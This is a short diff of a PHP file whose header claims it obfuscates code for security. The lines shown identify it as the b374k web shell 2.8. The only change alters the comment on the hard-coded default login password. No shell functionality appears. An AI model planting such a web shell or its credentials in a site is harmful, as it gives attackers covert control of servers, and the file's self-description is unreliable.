@@ -8,7 +8,7 @@
     |  Description: Obfuscates PHP code to increase security and protect source code. |
     |_________________________________________________________________________________|
 */
-$s_pass = "f687ec2bafd02578b2e1010dd055c0f1de437ace"; // default password : b374k (login and change to new password)
+$s_pass = "f687ec2bafd02578b2e1010dd055c0f1de437ace"; // default password : R00t (login and change to new password)
 
 $s_ver = "2.8"; // shell ver
 $s_title = "b374k ".$s_ver; // shell title
